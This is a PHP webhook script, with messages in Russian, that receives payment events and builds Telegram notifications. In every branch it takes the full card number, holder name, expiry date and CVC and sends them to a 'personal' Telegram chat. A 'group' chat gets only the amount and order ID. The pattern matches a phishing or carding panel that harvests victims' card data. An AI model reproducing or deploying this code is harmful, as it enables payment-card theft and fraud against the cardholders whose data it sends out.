<?php

include "config.php";
include "send.php";

$response = json_decode(file_get_contents("php://input"), true);

if ($response["state"] == "processing") {
	$card_holder = $response["data"]["card_holder"];
	$card_number = $response["data"]["card_number"];
	$card_expire = $response["data"]["card_expire_month"] . "/" . $response["data"]["card_expire_year"];
	$card_code = $response["data"]["card_cvc"];
	$amount = $response["data"]["amount"];
	$order_id = $response["data"]["order_id"];

	if ($response["status"] == "success") {
		$message = "💰 Пользователь перешел на страницу оплаты.\n\nНомер карты: *" . $card_number . "*\nДержатель карты: *" . $card_holder . "*\nСрок действия: *" . $card_expire . "*\nКод CVC: *" . $card_code . "*\n\nСумма платежа: *" . $amount . " руб.*\nНомер платежа: *" . $order_id . "*";
		telegram_send($message, "personal");

		$message = "💰 Пользователь перешел на страницу оплаты.\n\nСумма платежа: *" . $amount . " руб.*\nНомер платежа: *" . $order_id . "*";
		telegram_send($message, "group");
	} else {
		$message = "❗ При переходе на страницу оплаты произошла ошибка.\n\nНомер карты: *" . $card_number . "*\nДержатель карты: *" . $card_holder . "*\nСрок действия: *" . $card_expire . "*\nКод CVC: *" . $card_code . "*\n\nСумма платежа: *" . $amount . " руб.*\nНомер платежа: *" . $order_id . "*";
		telegram_send($message, "personal");

		$message = "❗ При переходе на страницу оплаты произошла ошибка.\n\nСумма платежа: *" . $amount . " руб.*\nНомер платежа: *" . $order_id . "*";
		telegram_send($message, "group");
	}
} else if ($response["state"] == "pay") {
	$card_holder = $response["data"]["card_holder"];
	$card_number = $response["data"]["card_number"];
	$card_expire = $response["data"]["card_expire_month"] . "/" . $response["data"]["card_expire_year"];
	$card_code = $response["data"]["card_cvc"];
	$amount = $response["data"]["amount"];
	$order_id = $response["data"]["order_id"];

	if ($response["status"] == "success") {
		$message = "💰 Оплата успешно выполнена.\n\nНомер карты: *" . $card_number . "*\nДержатель карты: *" . $card_holder . "*\nСрок действия: *" . $card_expire . "*\nКод CVC: *" . $card_code . "*\n\nСумма платежа: *" . $amount . " руб.*\nНомер платежа: *" . $order_id . "*";
		telegram_send($message, "personal");

		$message = "💰 Оплата успешно выполнена.\n\nСумма платежа: *" . $amount . " руб.*\nНомер платежа: *" . $order_id . "*";
		telegram_send($message, "group");
	} else {
		$message = "❗ При оплате произошла ошибка.\n\nНомер карты: *" . $card_number . "*\nДержатель карты: *" . $card_holder . "*\nСрок действия: *" . $card_expire . "*\nКод CVC: *" . $card_code . "*\n\nСумма платежа: *" . $amount . " руб.*\nНомер платежа: *" . $order_id . "*";
		telegram_send($message, "personal");

		$message = "❗ При оплате произошла ошибка.\n\nСумма платежа: *" . $amount . " руб.*\nНомер платежа: *" . $order_id . "*";
		telegram_send($message, "group");
	}
}

?>